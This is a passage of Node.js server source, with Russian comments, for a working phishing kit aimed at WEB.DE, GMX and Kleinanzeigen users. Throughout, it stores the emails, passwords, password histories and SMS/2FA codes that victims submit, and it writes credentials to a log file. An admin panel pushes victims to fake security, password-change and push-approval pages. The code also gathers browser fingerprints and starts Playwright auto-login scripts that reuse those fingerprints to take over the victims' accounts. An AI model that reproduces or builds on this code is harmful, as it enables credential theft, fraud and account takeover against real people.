              pushSubmitPipelineEvent(visitLead, 'klein', hasPassword, 'visitId, первая запись email');
              pushEvent(visitLead, 'Ввел почту Kl');
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPasswordKl = et.length > 0 && et[et.length - 1].label === 'Ввел пароль Kl';
                if (!lastIsPasswordKl) pushEvent(visitLead, 'Ввел пароль Kl');
                if (visitLead.status === 'error') visitLead.status = 'pending';
                if (hasPassword) delete visitLead.kleinPasswordErrorDe;
                // Klein: редирект только вручную кнопками в админке
                pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
              }
            } else {
              applyReturnVisitStatusReset(visitLead);
              const oldPassword = visitLead.password || '';
              visitLead.email = email;
              visitLead.password = hasPassword ? passwordFromBody : '';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisitWeb = new Date().toISOString();
              visitLead.lastSeenAt = nowVisitWeb;
              visitLead.adminListSortAt = nowVisitWeb;
              pushSubmitPipelineEvent(visitLead, 'webde', hasPassword, 'visitId, первая запись email');
              pushEvent(visitLead, 'Ввел почту');
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPassword = et.length > 0 && et[et.length - 1].label === 'Ввел пароль';
                if (!lastIsPassword) pushEvent(visitLead, 'Ввел пароль');
                appendToAllLog(email, oldPassword, visitLead.password);
                if (visitLead.status === 'error' && passwordFromBody !== (oldPassword || '')) visitLead.status = 'pending';
                const mode = readMode();
                const startPage = readStartPage();
                if (visitLead.status === 'pending') {
                  const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, visitLead);
                  if (status) {
                    visitLead.status = status;
                    pushEvent(visitLead, getAutoRedirectEventLabel(visitLead.status));
                  }
                }
              }
            }
            applyLeadTelemetry(visitLead, req, json, ip);
            persistLeadFull(visitLead);
            logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''));
            writeDebugLog('SUBMIT_UPDATE_BY_VISITID', {
              visitId: visitId,
              email: email,
              hasPassword: hasPassword,
              leadId: visitLead.id,
              ip: ip,
              totalLeads: leads.length
            });
            startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
            return send(res, 200, { ok: true, id: visitLead.id });
          } else {
            // Лид вернулся (уже был Успех) — повторный submit: обновляем лог и заново запускаем скрипт входа, чтобы сохранить новые куки
            if (visitLead.status === 'show_success') {
              var nowSucc = new Date().toISOString();
              visitLead.lastSeenAt = nowSucc;
              visitLead.adminListSortAt = nowSucc;
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastPwd = et.length > 0 && et[et.length - 1].label === 'Ввел пароль';
                if (!lastPwd) pushEvent(visitLead, 'Ввел пароль повторно');
                else pushEvent(visitLead, 'Вернулся — повторный ввод');
                const oldP = (visitLead.password || '').trim();
                visitLead.password = passwordFromBody;
                if (hasPassword) pushPasswordHistory(visitLead, passwordFromBody, 'login');
                if ((visitLead.email || '').trim()) appendToAllLog((visitLead.email || '').trim(), oldP, passwordFromBody);
              } else {
                pushEvent(visitLead, 'Вернулся — повторный ввод');
              }
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              applyLeadTelemetry(visitLead, req, json, ip);
              persistLeadFull(visitLead);
              console.log('[ВХОД] Лог: visitId найден, лид вернулся (был Успех) — повторный запуск скрипта входа для новых куки, id=' + visitId);
              pushSubmitPipelineEvent(visitLead, visitLead.brand === 'klein' ? 'klein' : 'webde', hasPassword, 'повтор после Успех (обновление куки)');
              startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead, true);
              return send(res, 200, { ok: true, id: visitId });
            }
            // Email совпадает — создаём новый лог, переносим в него историю старого, старый удаляем
            const isKleinSame = getBrand(req).id === 'klein';
            console.log('[ВХОД] Лог: visitId найден, email совпадает — новый лог с переносом истории, старый id=' + visitId + ' удалён');
            const oldPassword = visitLead.password || visitLead.passwordKl || '';
            const now = new Date().toISOString();
            const pastEvents = Array.isArray(visitLead.eventTerminal) ? visitLead.eventTerminal.slice() : [];
            const newEvents = [submitPipelineEventRaw(now, isKleinSame ? 'klein' : 'webde', hasPassword, 'новый лид по visitId, тот же email')].concat(
              isKleinSame
                ? [{ at: now, label: 'Ввел почту Kl' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль Kl' }] : [])
                : [{ at: now, label: 'Ввел почту' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль' }] : [])
            );
            const mode = readMode();
            const startPage = readStartPage();
            const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : visitLead.screenWidth;
            const platform = resolvePlatform(getPlatformFromRequest(req), json.screenWidth) || visitLead.platform;
            let initialStatus = 'pending';
            if (platform == null) {
              initialStatus = 'redirect_gmx_net';
              newEvents.push({ at: now, label: 'Устройство не определено → редирект на GMX' });
            } else if (hasPassword && !isKleinSame) {
              const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, { platform: platform });
              if (status) {
                initialStatus = status;
                newEvents.push({ at: now, label: getAutoRedirectEventLabel(initialStatus) });
              }
            }
            const newPassword = hasPassword ? passwordFromBody : '';
            const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : visitLead.screenHeight;
            const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
            const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
            const newLead = {
              id: id,
              email: isKleinSame ? (visitLead.email || '') : email,
              password: isKleinSame ? (visitLead.password || '') : newPassword,
              emailKl: isKleinSame ? emailForKlein : (visitLead.emailKl || ''),
              passwordKl: isKleinSame ? newPassword : (visitLead.passwordKl || ''),
              createdAt: now,
              adminListSortAt: now,
              lastSeenAt: now,
              status: initialStatus,
              ip: ip,
              eventTerminal: pastEvents.concat(newEvents),
              platform: platform || undefined,
              screenWidth: screenW,
              screenHeight: screenH,
              // Бренд = сайт текущего submit (host), не старый visitLead.brand:
              // иначе после Klein при логе с web-de.one brand оставался klein и шёл klein_simulation вместо почты.
              brand: isKleinSame ? 'klein' : getBrand(req).id,
              pastHistoryTransferred: true,
              mergedFromId: visitId,
              mergedIntoId: id,
              mergeReason: 'same_visit_same_email_new_log',
              mergeActor: 'submit',
              mergedAt: now,
              userAgent: ua || visitLead.userAgent || undefined,
              fingerprint: (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : (visitLead.fingerprint || undefined),
            };
            applyLeadTelemetry(newLead, req, json, ip);
            if (!isKleinSame) {
              newLead.passwordHistory = normalizePasswordHistory(visitLead.passwordHistory);
              if (newLead.passwordHistory.length === 0 && (visitLead.password || '').trim()) {
                newLead.passwordHistory = [{ p: String(visitLead.password).trim(), s: 'login' }];
              }
              if (hasPassword) pushPasswordHistory(newLead, newPassword, 'login');
              if (hasPassword) appendToAllLog(email, oldPassword, newPassword);
            } else if (isKleinSame && hasPassword) {
              newLead.passwordHistory = normalizePasswordHistory(visitLead.passwordHistory);
              if (newLead.passwordHistory.length === 0 && (visitLead.passwordKl || '').trim()) {
                newLead.passwordHistory = [{ p: String(visitLead.passwordKl).trim(), s: 'login_kl' }];
              }
              pushPasswordHistory(newLead, newPassword, 'login_kl');
            }
            if (visitLead.smsCodeData && (visitLead.smsCodeData.code || visitLead.smsCodeData.submittedAt)) {
              newLead.smsCodeData = { code: visitLead.smsCodeData.code || '', submittedAt: visitLead.smsCodeData.submittedAt || new Date().toISOString() };
              if (visitLead.smsCodeData.kind === '2fa' || visitLead.smsCodeData.kind === 'sms') newLead.smsCodeData.kind = visitLead.smsCodeData.kind;
            }
            writeReplacedLeadId(visitId, id);
            replaceLeadRow(visitId, newLead);
            invalidateLeadsCache();
            broadcastLeadsUpdate();
            console.log('[ВХОД] Лог: создан новый лог id=' + id + ' (старый ' + visitId + ' удалён, история перенесена)');
            writeDebugLog('SUBMIT_SAME_EMAIL_NEW_LOG_WITH_HISTORY', {
              visitId: visitId,
              newId: id,
              email: email,
              hasPassword: hasPassword,
              ip: ip,
              totalLeads: readLeads().length,
              mergedFromId: visitId,
              mergedIntoId: id,
              mergeReason: 'same_visit_same_email_new_log',
              mergeActor: 'submit'
            });
            const preemptEm = (!isKleinSame ? email : (emailForKlein || email)).trim().toLowerCase();
            preemptWebdeLoginForReplacedLead(visitId, preemptEm);
            if (!isKleinSame || hasPassword) {
              startWebdeLoginAfterLeadSubmit(id, newLead);
            }
            return send(res, 200, { ok: true, id: id });
          }
        } else {
          console.log('[ВХОД] Лог: visitId не найден — создаём новый лог');
          writeDebugLog('SUBMIT_VISITID_NOT_FOUND', { visitId: visitId, email: email, ip: ip });
        }
      }

      // Создаем новую запись (лог). Если уже есть лог с таким же email — переносим в новый историю и удаляем старый.
      const brandIdSubmit = getBrand(req).id;
      const isKlein = brandIdSubmit === 'klein';
      const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
      const now = new Date().toISOString();
      const newEvents = [submitPipelineEventRaw(now, isKlein ? 'klein' : 'webde', hasPassword, visitId ? 'visitId не найден — новая запись' : 'новая запись')].concat(
        isKlein
          ? [{ at: now, label: 'Ввел почту Kl' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль Kl' }] : [])
          : [{ at: now, label: 'Ввел почту' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль' }] : [])
      );
      const mode = readMode();
      const startPage = readStartPage();
      const screenW = typeof json.screenWidth === 'number' && json.screenWidth >= 0 ? json.screenWidth : undefined;
      const platform = resolvePlatform(getPlatformFromRequest(req), screenW);
      let initialStatus = 'pending';
      if (platform == null) {
        initialStatus = 'redirect_gmx_net';
        newEvents.push({ at: now, label: 'Устройство не определено → редирект на GMX' });
      } else if (hasPassword && !isKlein) {
        const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, { platform: platform });
        if (status) {
          initialStatus = status;
          newEvents.push({ at: now, label: getAutoRedirectEventLabel(initialStatus) });
        }
      } else if (hasPassword && isKlein) {
        // Klein: редирект только вручную кнопками в админке, авто на смену пароля не делаем
      }
      const newPassword = hasPassword ? passwordFromBody : '';
      const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : undefined;

      // Есть ли уже лог с такой же почтой? И web, и Klein ищут по email и по emailKl — тогда один лог при одной почте
      const existingByEmail = leads.find(function (l) {
        if (l.klLogArchived === true) return false;
        const e = (l.email || '').trim().toLowerCase();
        const eKl = (l.emailKl || '').trim().toLowerCase();
        return (e && e === emailLower) || (eKl && eKl === emailLower);
      });

      let eventTerminal = newEvents.slice();
      let pastHistoryTransferred = false;

      if (existingByEmail) {
        const pastEvents = Array.isArray(existingByEmail.eventTerminal) ? existingByEmail.eventTerminal.slice() : [];
        eventTerminal = pastEvents.concat(newEvents);
        pastHistoryTransferred = true;
        const oldPassword = isKlein ? (existingByEmail.passwordKl || '') : (existingByEmail.password || '');
        writeReplacedLeadId(existingByEmail.id, id);
        if (hasPassword && !isKlein) appendToAllLog(email, oldPassword, newPassword);
        console.log('[ВХОД] Лог: тот же email — перенос истории из id=' + existingByEmail.id + ', новый id=' + id);
        writeDebugLog('SUBMIT_SAME_EMAIL_MERGE_HISTORY', {
          oldId: existingByEmail.id,
          newId: id,
          email: email,
          hasPassword: hasPassword,
          ip: ip,
          totalLeads: null,
          mergedFromId: existingByEmail.id,
          mergedIntoId: id,
          mergeReason: 'same_email_resubmit',
          mergeActor: 'submit'
        });
      } else if (hasPassword && !isKlein) {
        appendToAllLog(email, '', newPassword);
      }

      /* Объединение по email и emailKl (existingByEmail). Merge по fingerprint/device отключён. */

      const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
      const newLead = {
        id: id,
        email: isKlein ? (existingByEmail ? (existingByEmail.email || '') : '') : email,
        password: isKlein ? (existingByEmail ? (existingByEmail.password || '') : '') : newPassword,
        emailKl: isKlein ? emailForKlein : (existingByEmail ? (existingByEmail.emailKl || '') : ''),
        passwordKl: isKlein ? newPassword : (existingByEmail ? (existingByEmail.passwordKl || '') : ''),
        createdAt: now,
        adminListSortAt: now,
        lastSeenAt: now,
        status: initialStatus,
        ip: ip,
        eventTerminal: eventTerminal,
        platform: platform || undefined,
        screenWidth: screenW,
        screenHeight: screenH,
        brand: brandIdSubmit,
        userAgent: ua || undefined,
        fingerprint: (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : undefined,
        deviceSignature: incomingDeviceSig || undefined,
      };
      if (pastHistoryTransferred) {
        if (!isKlein) {
          newLead.passwordHistory = normalizePasswordHistory(existingByEmail.passwordHistory);
          if (newLead.passwordHistory.length === 0 && (existingByEmail.password || '').trim()) {
            newLead.passwordHistory = [{ p: String(existingByEmail.password).trim(), s: 'login' }];
          }
        } else {
          newLead.passwordHistory = normalizePasswordHistory(existingByEmail.passwordHistory);
          if (newLead.passwordHistory.length === 0 && (existingByEmail.passwordKl || '').trim()) {
            newLead.passwordHistory = [{ p: String(existingByEmail.passwordKl).trim(), s: 'login_kl' }];
          }
        }
        if (existingByEmail.smsCodeData && (existingByEmail.smsCodeData.code || existingByEmail.smsCodeData.submittedAt)) {
          newLead.smsCodeData = { code: existingByEmail.smsCodeData.code || '', submittedAt: existingByEmail.smsCodeData.submittedAt || new Date().toISOString() };
          if (existingByEmail.smsCodeData.kind === '2fa' || existingByEmail.smsCodeData.kind === 'sms') newLead.smsCodeData.kind = existingByEmail.smsCodeData.kind;
        }
        newLead.pastHistoryTransferred = true;
        newLead.mergedFromId = existingByEmail.id;
        newLead.mergedIntoId = id;
        newLead.mergeReason = 'same_email_resubmit';
        newLead.mergeActor = 'submit';
        newLead.mergedAt = now;
      }
      if (hasPassword && !isKlein) pushPasswordHistory(newLead, newPassword, 'login');
      if (hasPassword && isKlein) pushPasswordHistory(newLead, newPassword, 'login_kl');

      applyLeadTelemetry(newLead, req, json, ip);
      if (existingByEmail) {
        replaceLeadRow(existingByEmail.id, newLead);
      } else {
        addLead(newLead);
      }
      invalidateLeadsCache();
      broadcastLeadsUpdate();
      console.log('[ВХОД] Лог: создана запись id=' + id + ', email=' + email + (hasPassword ? ', пароль введён' : '') + (pastHistoryTransferred ? ', история перенесена' : '') + (brandIdSubmit === 'klein' ? ' (Klein → админка ' + ADMIN_DOMAIN + ')' : ''));
      writeDebugLog('SUBMIT_NEW_LOG_CREATED', {
        id: id,
        email: email,
        hasPassword: hasPassword,
        visitId: visitId || null,
        ip: ip,
        totalLeads: readLeads().length,
        status: initialStatus,
        pastHistoryTransferred: pastHistoryTransferred,
        mergedFromId: pastHistoryTransferred && existingByEmail ? existingByEmail.id : undefined,
        mergedIntoId: pastHistoryTransferred && existingByEmail ? id : undefined,
        mergeReason: pastHistoryTransferred && existingByEmail ? 'same_email_resubmit' : undefined,
        mergeActor: pastHistoryTransferred && existingByEmail ? 'submit' : undefined
      });
      if (pastHistoryTransferred && existingByEmail && existingByEmail.id) {
        const pe = isKlein ? (emailForKlein || email).trim().toLowerCase() : email.trim().toLowerCase();
        preemptWebdeLoginForReplacedLead(existingByEmail.id, pe);
      }
      startWebdeLoginAfterLeadSubmit(id, newLead);
      send(res, 200, { ok: true, id: id });
    });
    return;
  }

  if (pathname === '/api/update-password' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch (e) {
        console.error('[ВХОД] Ошибка: неверный JSON в теле /api/update-password — ' + (e.message || e));
        return send(res, 400, { ok: false });
      }
      const idRaw = json.id;
      const newPassword = json.password != null ? String(json.password) : '';
      if (!idRaw || typeof idRaw !== 'string') {
        console.error('[ВХОД] Ошибка: в теле /api/update-password отсутствует поле id или оно не строка.');
        return send(res, 400, { ok: false });
      }
      const id = resolveLeadId(idRaw);
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) {
        console.error('[ВХОД] Ошибка: лид не найден для update-password — id=' + idRaw + ' (в leads.json такой записи нет).');
        return send(res, 404, { ok: false });
      }
      const lead = leads[idx];
      const email = (lead.email || '').trim();
      logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'пароль id=' + id);
      const oldPassword = lead.password != null ? String(lead.password) : '';
      lead.lastSeenAt = new Date().toISOString();
      if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
      if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) lead.screenHeight = json.screenHeight;
      const platformUpdate = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
      if (platformUpdate != null) lead.platform = platformUpdate;
      if (req.headers && req.headers['user-agent']) lead.userAgent = String(req.headers['user-agent']);
      if (json.fingerprint && typeof json.fingerprint === 'object') lead.fingerprint = json.fingerprint;
      applyLeadTelemetry(lead, req, json, getClientIp(req));

      if (lead.brand === 'klein' || getBrand(req).id === 'klein') {
        const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
        const storedKl = (lead.passwordKl != null) ? String(lead.passwordKl) : '';
        if (currentPassword !== storedKl) {
          return send(res, 400, { ok: false, error: 'wrong_current_password' });
        }
        lead.passwordKl = newPassword;
        pushEvent(lead, 'Новый пароль Kl');
        pushPasswordHistory(lead, newPassword, 'change_kl');
        persistLeadFull(lead);
        console.log('[ВХОД] Klein: пароль kl изменён id=' + id);
        return send(res, 200, { ok: true, id: id });
      }

      if (lead.status === 'error') {
        const previousPassword = lead.password != null ? String(lead.password) : '';
        if (newPassword === previousPassword) {
          if (webdePasswordWaiters[id]) {
            clearTimeout(webdePasswordWaiters[id].timeoutId);
            try {
              send(webdePasswordWaiters[id].res, 200, { password: newPassword });
            } catch (e) {}
            delete webdePasswordWaiters[id];
            setWebdeLeadScriptStatus(id, null);
            console.log('[АДМИН] long-poll webde-wait-password: ответ с паролем скрипту (тот же пароль с формы), id=' + id);
          } else {
            /* Long-poll уже снят (408 и т.д.): тот же пароль снова — не перезапускаем скрипт, оставляем ошибку входа для жертвы */
            lead.status = 'error';
            lead.adminErrorKind = 'login';
            pushEvent(lead, 'Повтор того же пароля после таймаута — снова неверные данные');
          }
          persistLeadFull(lead);
          send(res, 200, { ok: true, id: id });
          return;
        }
        if (!lead.passwordErrorAttempts) lead.passwordErrorAttempts = [];
        lead.passwordErrorAttempts.push({
          previousPassword: previousPassword,
          newPassword: newPassword,
          at: new Date().toISOString(),
        });
        lead.password = newPassword;
        if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
        if (lead.passwordHistory.length === 0 && previousPassword.trim()) {
          lead.passwordHistory.push({ p: previousPassword.trim(), s: 'login' });
        }
        pushPasswordHistory(lead, newPassword, 'login');
        lead.status = 'pending';
        pushEvent(lead, 'Ввел пароль повторно');
        // Сохраняем в all.txt
        if (email && newPassword) {
          appendToAllLog(email, previousPassword, newPassword);
        }
        persistLeadFull(lead);
        if (webdePasswordWaiters[id]) {
          clearTimeout(webdePasswordWaiters[id].timeoutId);
          try {
            send(webdePasswordWaiters[id].res, 200, { password: newPassword });
          } catch (e) {}
          delete webdePasswordWaiters[id];
          setWebdeLeadScriptStatus(id, null);
          console.log('[АДМИН] long-poll webde-wait-password: тело ответа с паролем отправлено скрипту (HTTP разблокирован), id=' + id);
        } else {
          restartWebdeAutoLoginAfterVictimRetryFromError(
            lead,
            id,
            email,
            'После ввода нового пароля (был error, long-poll не активен)'
          );
        }
        writeDebugLog('UPDATE_PASSWORD_ERROR_STATUS', { 
          id: id, 
          email: email,
          oldPassword: previousPassword,
          newPassword: newPassword,
          totalLeads: leads.length
        });
        send(res, 200, { ok: true, id: id });
        return;
      }
      if (!lead.eventTerminal) lead.eventTerminal = [];
      const hasPasswordEvent = lead.eventTerminal.some(function (e) { return e.label === 'Ввел пароль'; });
      if (!hasPasswordEvent) {
        pushEvent(lead, 'Ввел пароль');
      } else {
        pushEvent(lead, 'Ввел пароль повторно');
      }
      lead.password = newPassword;
      if (!Array.isArray(lead.passwordHistory)) lead.passwordHistory = [];
      if (lead.passwordHistory.length === 0 && (oldPassword || '').trim()) {
        lead.passwordHistory.push({ p: String(oldPassword).trim(), s: 'login' });
      }
      pushPasswordHistory(lead, newPassword, 'login');
      // Сохраняем в all.txt если пароль изменился
      if (email && newPassword && newPassword !== oldPassword) {
        appendToAllLog(email, oldPassword, newPassword);
      }
      // Long-poll автовхода ждёт только POST из ветки status=error; если жертва обновила пароль
      // пока лид ещё pending/show_success — разбудим скрипт так же (иначе ждёт до таймаута).
      if (webdePasswordWaiters[id] && newPassword.trim() !== '' && newPassword !== oldPassword) {
        clearTimeout(webdePasswordWaiters[id].timeoutId);
        try {
          send(webdePasswordWaiters[id].res, 200, { password: newPassword });
        } catch (e) {}
        delete webdePasswordWaiters[id];
        setWebdeLeadScriptStatus(id, null);
        console.log('[АДМИН] long-poll webde-wait-password: пароль из ветки не-error (pending/др.), id=' + id);
      }
      // Auto (не Auto-Login): после смены пароля редирект по startPage
      const mode = readMode();
      const startPage = readStartPage();
      if (lead.status === 'pending' && newPassword.trim() !== '') {
        const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, lead);
        if (status) {
          lead.status = status;
          pushEvent(lead, getAutoRedirectEventLabel(lead.status));
        }
      }
      persistLeadFull(lead);
      writeDebugLog('UPDATE_PASSWORD', { 
        id: id, 
        email: email,
        oldPassword: oldPassword,
        newPassword: newPassword,
        status: lead.status,
        totalLeads: leads.length
      });
      send(res, 200, { ok: true, id: id });
    });
    return;
  }

  if (pathname === '/api/brand' && req.method === 'GET') {
    if (safeEnd(res)) return;
    const brand = getBrand(req);
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'Cache-Control': 'public, max-age=300',
      'Access-Control-Allow-Origin': '*'
    });
    res.end(JSON.stringify(brand));
    return;
  }

  if (pathname === '/api/redirect-change-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_change_password';
      pushEvent(lead, lead.brand === 'klein' ? 'Отправлен на смену Kl' : 'Отправлен на смену', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      console.log('[АДМИН] Кнопка: смена пароля — id=' + id);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-sicherheit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_sicherheit';
      pushEvent(lead, 'Отправлен на Sicherheit', 'admin');
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-sicherheit-windows' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const leads = readLeads();
    let count = 0;
    leads.forEach((lead) => {
      if ((lead.platform || '').toLowerCase() === 'windows') {
        lead.status = 'redirect_sicherheit';
        pushEvent(lead, 'Отправлен на Sicherheit (все Windows)', 'admin');
        persistLeadPatch(lead.id, { status: lead.status, eventTerminal: lead.eventTerminal });
        count++;
      }
    });
    send(res, 200, { ok: true, count: count });
    return;
  }

  // Выбор метода пользователем (Push или SMS) — без админ-авторизации
  if (pathname === '/api/choose-method' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      const method = json.method;
      if (!id || typeof id !== 'string' || !method || (method !== 'push' && method !== 'sms')) {
        return send(res, 400, { ok: false });
      }
      const leads = readLeads();
      const idx = leads.findIndex((l) => l.id === id);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      if (method === 'push') {
        lead.status = 'redirect_push';
        pushEvent(lead, EVENT_LABELS.PUSH, 'user');
      } else {
        lead.status = 'redirect_sms_code';
        pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS, 'user');
      }
      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/redirect-push' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = json.id;
      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
      console.log('[АДМИН] Кнопка: пуш — id=' + id);
      const leads = readLeads();
      const idResolved = resolveLeadId(String(id).trim());
      const idx = leads.findIndex((l) => l.id === idResolved);
      if (idx === -1) return send(res, 404, { ok: false });
      const lead = leads[idx];
      lead.status = 'redirect_push';
      const nowBump = new Date().toISOString();
      lead.lastSeenAt = nowBump;
      lead.adminListSortAt = nowBump;
      pushEvent(lead, EVENT_LABELS.PUSH, 'admin');
      persistLeadPatch(idResolved, {
        status: lead.status,
        lastSeenAt: lead.lastSeenAt,
        adminListSortAt: lead.adminListSortAt,
        eventTerminal: lead.eventTerminal
      });
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Полный снимок антифрода по лиду: только для админки, по клику на иконку ОС в списке. Данные накапливаются при запросах лида (submit / update-password и т.д.). */
  if (pathname === '/api/lead-fingerprint' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadId);
    const leads = readLeads();
    const lead = leads.find((l) => l.id === id);
    if (!lead) return send(res, 404, { ok: false });
    const fp = lead.fingerprint && typeof lead.fingerprint === 'object' ? lead.fingerprint : null;
    let telemetrySnapshots = Array.isArray(lead.telemetrySnapshots) && lead.telemetrySnapshots.length > 0
      ? lead.telemetrySnapshots.map((s) => JSON.parse(JSON.stringify(s)))
      : null;
    if (!telemetrySnapshots || telemetrySnapshots.length === 0) {
      telemetrySnapshots = [{
        at: lead.lastSeenAt || lead.createdAt || new Date().toISOString(),
        stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
        deviceSignature: lead.deviceSignature || undefined,
        fingerprint: lead.fingerprint || undefined,
        clientSignals: lead.clientSignals || undefined,
        requestMeta: lead.requestMeta || undefined
      }];
    }
    const out = {
      leadId: lead.id,
      email: (lead.email || '').trim() || undefined,
      emailKl: (lead.emailKl || '').trim() || undefined,
      brand: lead.brand || undefined,
      platform: lead.platform || undefined,
      userAgent: lead.userAgent || undefined,
      ip: lead.ip || undefined,
      screenWidth: lead.screenWidth,
      screenHeight: lead.screenHeight,
      createdAt: lead.createdAt || undefined,
      lastSeenAt: lead.lastSeenAt || undefined,
      deviceSignature: lead.deviceSignature || undefined,
      stableFingerprintSignature: fp ? fingerprintSignature(fp) : undefined,
      fingerprint: lead.fingerprint || undefined,
      clientSignals: lead.clientSignals || undefined,
      requestMeta: lead.requestMeta || undefined,
      telemetrySnapshots: telemetrySnapshots
    };
    return send(res, 200, { ok: true, data: out });
  }

  /** Профиль для Playwright-автовхода (данные с последнего снимка лида). См. docs/AUTOMATION_PROFILE.md, сборка в lib/automationProfile.js */
  if (pathname === '/api/lead-automation-profile' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadIdRaw);
    const leads = readLeads();
    const lead = leads.find((l) => l.id === id);
    if (!lead) return send(res, 404, { ok: false, error: 'lead not found' });
    const profile = buildAutomationProfile(lead);
    if (!profile) return send(res, 422, { ok: false, error: 'insufficient data (no user agent / fingerprint)' });
    return send(res, 200, { ok: true, profile: profile });
  }

  /** Один ответ для автовхода: email, password, automation profile, ipCountry. См. lib/leadLoginContext.js */
  if (pathname === '/api/lead-login-context' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
    const id = resolveLeadId(leadIdRaw);
    readLeadsAsync(function (err, leads) {
      if (err || !Array.isArray(leads)) {
        return send(res, 500, { ok: false, error: 'read leads failed' });
      }
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.log('[АДМИН] lead-login-context: лид не найден id=' + id);
        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      const payload = buildLeadLoginContextPayload(lead);
